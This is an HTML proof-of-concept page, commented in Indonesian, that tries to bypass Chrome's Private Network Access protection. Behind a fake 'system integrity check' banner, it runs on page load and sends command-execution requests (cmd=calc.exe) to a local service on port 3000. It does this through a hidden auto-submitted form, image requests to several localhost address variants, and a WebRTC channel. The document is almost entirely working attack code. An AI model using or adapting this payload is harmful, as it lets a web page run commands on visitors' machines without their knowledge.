<!DOCTYPE html>
<html>
<head>
    <title>Bypassing Chrome PNA Policy</title>
</head>
<body style="background:black; color:white; font-family:sans-serif; text-align:center;">
    <h1>SYSTEM INTEGRITY CHECK</h1>
    <p>Testing bypass on Private Network Access...</p>

    <!-- Hidden form untuk bypass fetch policy -->
    <form id="pwnForm" action="http://127.0.0.1:3000/exec" method="GET" target="hiddenFrame">
        <input type="hidden" name="cmd" value="calc.exe">
    </form>
    <iframe name="hiddenFrame" style="display:none;"></iframe>

    <script>
        async function advancedPwn() {
            // Teknik 1: Auto-submit Form (Sering dianggap interaksi user tingkat rendah)
            document.getElementById('pwnForm').submit();

            // Teknik 2: WebRTC IP Leakage & Connection
            // Mencoba "menyentuh" localhost via jalur WebRTC
            const pc = new RTCPeerConnection();
            pc.createDataChannel("pwn");
            pc.createOffer().then(offer => pc.setLocalDescription(offer));

            // Teknik 3: Brute-force IP (0.0.0.0 vs 127.0.0.1 vs [::1])
            const variations = ["http://127.0.0.1:3000", "http://0.0.0.0:3000", "http://[::]:3000"];
            variations.forEach(host => {
                const img = new Image();
                img.src = `${host}/exec?cmd=calc.exe`;
            });
        }

        window.onload = () => {
            setTimeout(advancedPwn, 1000);
        };
    </script>
</body>
</html>
